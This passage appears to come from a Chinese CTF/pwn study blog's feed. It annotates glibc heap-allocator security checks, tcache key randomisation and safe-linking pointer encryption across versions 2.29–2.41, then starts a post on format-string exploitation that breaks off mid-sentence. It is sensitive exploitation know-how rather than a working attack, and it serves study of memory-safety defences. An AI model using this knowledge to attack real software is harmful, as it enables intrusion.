class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;; )<br>  &#123;<br>    <span class="hljs-type">int</span> iters = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="hljs-comment">//遍历unsorted bin</span><br>      &#123;<br>        bck = victim-&gt;bk;<span class="hljs-comment">//获取当前块的前一个块</span><br>        size = chunksize (victim);<span class="hljs-comment">//获取当前块大小</span><br>        mchunkptr next = chunk_at_offset (victim, size);<span class="hljs-comment">//获取下一个块</span><br><br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>            || __glibc_unlikely (size &gt; av-&gt;system_mem))<span class="hljs-comment">//检查当前块大小是否有效</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="hljs-number">2</span> * SIZE_SZ)<span class="hljs-comment">//检查下个块大小是否有效</span><br>            || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))<br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))<span class="hljs-comment">//检查下个块的pre_size是否与当前快大小匹配</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)<br>            || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))<span class="hljs-comment">//检查双向链表是否损坏</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);<br>        <span class="hljs-keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<span class="hljs-comment">//检查下个块是否被使用</span><br>          malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><p>就是一些检查，检查内存块以及双向链表</p><h3 id="unsortedbin"><a href="#unsortedbin" class="headerlink" title="unsortedbin"></a>unsortedbin</h3><p>在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size<br>  == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>                            malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                      <span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<br>                        malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br>                    &#125;<br></code></pre></td></tr></table></figure><p>新增了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<span class="hljs-comment">//检查链表完整性</span><br>                            malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br></code></pre></td></tr></table></figure><p>和</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<span class="hljs-comment">//检查连表完整性</span><br>                        malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br></code></pre></td></tr></table></figure><p>就是多了点检查</p><h3 id="top-chunk-1"><a href="#top-chunk-1" class="headerlink" title="top chunk"></a>top chunk</h3><p>多了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure><p>检查<code>top chunk</code>大小是否超过了系统分配的内存总量，若超过则说明内存管理器数据被破坏，就报错</p><h2 id="libc-free-2"><a href="#libc-free-2" class="headerlink" title="_libc_free"></a>_libc_free</h2><p>没变</p><h2 id="int-free-2"><a href="#int-free-2" class="headerlink" title="_int_free"></a>_int_free</h2><p>变化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-type">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache != <span class="hljs-literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>      &#123;<br><span class="hljs-comment">/* Check to see if it&#x27;s already in the tcache.  */</span><br>tcache_entry *e = (tcache_entry *) chunk2mem (p);<br><br><span class="hljs-comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span><br><span class="hljs-comment">   trust it (it also matches random payload data at a 1 in</span><br><span class="hljs-comment">   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span><br><span class="hljs-comment">   coincidence before aborting.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))<br>  &#123;<br>    tcache_entry *tmp;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = tmp-&gt;next)<br>      <span class="hljs-keyword">if</span> (tmp == e)<br>malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br>    <span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">       few cycles, but don&#x27;t abort.  */</span><br>  &#125;<br><br><span class="hljs-keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>  &#123;<br>    tcache_put (p, tc_idx);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>就是在放入<code>tcache</code>时检测一下是不是双重释放，不是的话才放入<code>tcache</code></p><h1 id="glibc-2-35"><a href="#glibc-2-35" class="headerlink" title="glibc-2.35"></a>glibc-2.35</h1><h2 id="tcache-1"><a href="#tcache-1" class="headerlink" title="tcache"></a>tcache</h2><h3 id="结构体-1"><a href="#结构体-1" class="headerlink" title="结构体"></a>结构体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-type">uintptr_t</span> key;<br>&#125; tcache_entry<br></code></pre></td></tr></table></figure><p><code>key</code>的数据类型发生变化，变成无符号整型</p><p>并且多了初始化<code>key</code>的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The value of tcache_key does not really have to be a cryptographically</span><br><span class="hljs-comment">   secure random number.  It only needs to be arbitrary enough so that it does</span><br><span class="hljs-comment">   not collide with values present in applications.  If a collision does happen</span><br><span class="hljs-comment">   consistently enough, it could cause a degradation in performance since the</span><br><span class="hljs-comment">   entire list is checked to check if the block indeed has been freed the</span><br><span class="hljs-comment">   second time.  The odds of this happening are exceedingly low though, about 1</span><br><span class="hljs-comment">   in 2^wordsize.  There is probably a higher chance of the performance</span><br><span class="hljs-comment">   degradation being due to a double free where the first free happened in a</span><br><span class="hljs-comment">   different thread; that&#x27;s a case this check does not cover.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_key_initialize</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (__getrandom (&amp;tcache_key, <span class="hljs-keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)<br>      != <span class="hljs-keyword">sizeof</span> (tcache_key))<br>    &#123;<br>      tcache_key = random_bits ();<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> __WORDSIZE == 64</span><br>      tcache_key = (tcache_key &lt;&lt; <span class="hljs-number">32</span>) | random_bits ();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过随机化<code>key</code>防止攻击者修改固定的<code>key</code>值来实现攻击</p><h3 id="tcache-put-2"><a href="#tcache-put-2" class="headerlink" title="tcache_put"></a>tcache_put</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br></code></pre></td></tr></table></figure><p>保护指针（加密）</p><h3 id="tcache-get-2"><a href="#tcache-get-2" class="headerlink" title="tcache_get"></a>tcache_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br></code></pre></td></tr></table></figure><p>与上面那个配套使用，用于解密</p><h2 id="libc-malloc-3"><a href="#libc-malloc-3" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h2><p>去除了hook</p><h2 id="int-malloc-3"><a href="#int-malloc-3" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><h3 id="fastbin-4"><a href="#fastbin-4" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">     pp = REVEAL_PTR (victim-&gt;fd);                                     \<br>     <span class="hljs-keyword">if</span> (__glibc_unlikely (pp != <span class="hljs-literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned fastbin chunk detected&quot;</span>); \<br>   &#125;<br></code></pre></td></tr></table></figure><p>解密指针</p><p>检查对齐</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);<br><br><span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>  *fb = REVEAL_PTR (victim-&gt;fd);<br></code></pre></td></tr></table></figure><p>检查对齐</p><p>解密指针</p><p>tcache里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">     <span class="hljs-keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);<br>     <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>*fb = REVEAL_PTR (tc_victim-&gt;fd);<br></code></pre></td></tr></table></figure><p>检查对齐</p><p>解密指针并更新<code>fastbin</code>链表头部</p><h2 id="libc-free-3"><a href="#libc-free-3" class="headerlink" title="_libc_free"></a>_libc_free</h2><p>去除了hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-comment">/* See if the dynamic brk/mmap threshold needs adjusting.</span><br><span class="hljs-comment">Dumped fake mmapped chunks do not affect the threshold.  */</span><br>    <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>        &amp;&amp; chunksize_nomask (p) &gt; mp_.mmap_threshold<br>        &amp;&amp; chunksize_nomask (p) &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>      &#123;<br>        mp_.mmap_threshold = chunksize (p);<br>        mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>        LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                    mp_.mmap_threshold, mp_.trim_threshold);<br>      &#125;<br>    munmap_chunk (p);<br>  &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>    MAYBE_INIT_TCACHE ();<br><br>    <span class="hljs-comment">/* Mark the chunk as belonging to the library again.  */</span><br>    (<span class="hljs-type">void</span>)tag_region (chunk2mem (p), memsize (p));<br><br>    ar_ptr = arena_for_chunk (p);<br>    _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>  &#125;<br></code></pre></td></tr></table></figure><p>多了19行</p><p>标记内存块是库所有</p><h2 id="int-free-3"><a href="#int-free-3" class="headerlink" title="_int_free"></a>_int_free</h2><p>变化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache_key))<br>  &#123;<br>    tcache_entry *tmp;<br>    <span class="hljs-type">size_t</span> cnt = <span class="hljs-number">0</span>;<br>    LIBC_PROBE (memory_tcache_double_free, <span class="hljs-number">2</span>, e, tc_idx);<br>    <span class="hljs-keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<br> tmp;<br> tmp = REVEAL_PTR (tmp-&gt;next), ++cnt)<span class="hljs-comment">//解密</span><br>      &#123;<br><span class="hljs-keyword">if</span> (cnt &gt;= mp_.tcache_count)<span class="hljs-comment">//检查链表长度是不是超过了最大长度</span><br>  malloc_printerr (<span class="hljs-string">&quot;free(): too many chunks detected in tcache&quot;</span>);<br><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))<span class="hljs-comment">//检查对齐</span><br>  malloc_printerr (<span class="hljs-string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);<br><span class="hljs-keyword">if</span> (tmp == e)<span class="hljs-comment">//检查双重释放</span><br>  malloc_printerr (<span class="hljs-string">&quot;free(): double free detected in tcache 2&quot;</span>);<br><span class="hljs-comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span><br><span class="hljs-comment">   few cycles, but don&#x27;t abort.  */</span><br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h2 id="加密及解密宏"><a href="#加密及解密宏" class="headerlink" title="加密及解密宏"></a>加密及解密宏</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Safe-Linking:</span><br><span class="hljs-comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span><br><span class="hljs-comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span><br><span class="hljs-comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span><br><span class="hljs-comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span><br><span class="hljs-comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span><br><span class="hljs-comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span><br><span class="hljs-comment">   larger pages provide less entropy, although the pointer mangling</span><br><span class="hljs-comment">   still works.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr) \</span><br><span class="hljs-meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure><p>加密：将<code>pos</code>地址右移12位后与<code>ptr</code>异或得到加密数据</p><p>解密相反</p><h1 id="glibc-2-41"><a href="#glibc-2-41" class="headerlink" title="glibc-2.41"></a>glibc-2.41</h1><h2 id="tcache-2"><a href="#tcache-2" class="headerlink" title="tcache"></a>tcache</h2><h3 id="结构体-2"><a href="#结构体-2" class="headerlink" title="结构体"></a>结构体</h3><p>没变</p><h3 id="tcache-put-3"><a href="#tcache-put-3" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>没变</p><h3 id="tcache-get-3"><a href="#tcache-get-3" class="headerlink" title="tcache_get"></a>tcache_get</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get_n</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx, tcache_entry **ep)</span><br>&#123;<br>  tcache_entry *e;<br>  <span class="hljs-keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))<span class="hljs-comment">//若rp直接指向链表头节点，则直接获取</span><br>    e = *ep;<br>  <span class="hljs-keyword">else</span><br>    e = REVEAL_PTR (*ep);<span class="hljs-comment">//否则就解密</span><br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br><br>     <span class="hljs-comment">//更新链表头节点</span><br>  <span class="hljs-keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))<span class="hljs-comment">//若ep直接指向头节点，就解密并更新</span><br>      *ep = REVEAL_PTR (e-&gt;next);<br>  <span class="hljs-keyword">else</span><span class="hljs-comment">//否则就加密更新</span><br>    *ep = PROTECT_PTR (ep, REVEAL_PTR (e-&gt;next));<br><br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><p>相比于2.35新增可加密解密，提高安全性</p><h2 id="libc-malloc-4"><a href="#libc-malloc-4" class="headerlink" title="_libc_malloc"></a>_libc_malloc</h2><p>tcache的发生变化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-type">bool</span> err = tcache_try_malloc (bytes, &amp;victim);<span class="hljs-comment">//调用函数从tcache中分配内存</span><br><br>  <span class="hljs-keyword">if</span> (err)<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-keyword">if</span> (victim)<br>      <span class="hljs-keyword">return</span> tag_new_usable (victim);<span class="hljs-comment">//对内存块进行标记，标记为可用</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>将大部分代码封装在了<code>tcache_try_malloc</code>中，下面是代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">bool</span><br><span class="hljs-title function_">tcache_try_malloc</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> bytes, <span class="hljs-type">void</span> **memptr)</span><br>&#123;<br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-type">size_t</span> tbytes = checked_request2size (bytes);<span class="hljs-comment">//将请求大小转换为实际需要分配的大小</span><br>  <span class="hljs-keyword">if</span> (tbytes == <span class="hljs-number">0</span>)<span class="hljs-comment">//转换失败的情况</span><br>    &#123;<br>      __set_errno (ENOMEM);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>  <span class="hljs-type">size_t</span> tc_idx = csize2tidx (tbytes);<span class="hljs-comment">//根据实际分配的大小计算tcache bin的索引</span><br><br>  MAYBE_INIT_TCACHE ();<span class="hljs-comment">//初始化tcache（如果没初始化的话）</span><br><br>  <span class="hljs-keyword">if</span> (tcache_available (tc_idx))<span class="hljs-comment">//检查tcache是否可用</span><br>    *memptr = tcache_get (tc_idx);<span class="hljs-comment">//获取内存块</span><br>  <span class="hljs-keyword">else</span><br>    *memptr = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="int-malloc-4"><a href="#int-malloc-4" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>没变</p><h2 id="libc-free-4"><a href="#libc-free-4" class="headerlink" title="_libc_free"></a>_libc_free</h2><p>没变</p><h2 id="int-free-4"><a href="#int-free-4" class="headerlink" title="_int_free"></a>_int_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock)<br>&#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* its size */</span><br><br>  size = chunksize (p);<br><br>  _int_free_check (av, p, size);<span class="hljs-comment">//这是检查的函数</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE<span class="hljs-comment">//启用tcache的情况</span></span><br>  <span class="hljs-keyword">if</span> (tcache_free (p, size))<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  _int_free_chunk (av, p, size, have_lock);<span class="hljs-comment">//这是free的函数</span><br>&#125;<br></code></pre></td></tr></table></figure><p>被封装在了不同的函数里</p>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
      <category>堆</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串</title>
    <link href="/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2025/02/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">%<span class="hljs-selector-attr">[parameter]</span><span class="hljs-selector-attr">[flags]</span><span class="hljs-selector-attr">[field width]</span><span class="hljs-selector-attr">[.precision]</span><span class="hljs-selector-attr">[length]</span>type<br></code></pre></td></tr></table></figure><ul><li><p>parameter</p><ul><li><p>n$，获取格式化字符串中的指定参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">例如<br><span class="hljs-type">int</span> a=<span class="hljs-number">0x1111</span>,b=<span class="hljs-number">0x2222</span>,c=<span class="hljs-number">0x3333</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%3$p&quot;</span>,a,b,c)<br><span class="hljs-comment">//按理来说输出的是0x3333</span><br><span class="hljs-comment">//但我自己执行的时候输出的是$p，不知道什么原因</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>flag</p></li><li><p>field width</p><ul><li>输出的最小宽度</li></ul></li><li><p>precision</p><ul><li>输出的最大长度</li></ul></li><li><p>length，输出的长度</p><ul><li>hh，输出一个字节</li><li>h，输出一个双字节</li></ul></li><li><p>type</p><ul><li>d&#x2F;i，有符号整数</li><li>u，无符号整数</li><li>x&#x2F;X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。</li><li>o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 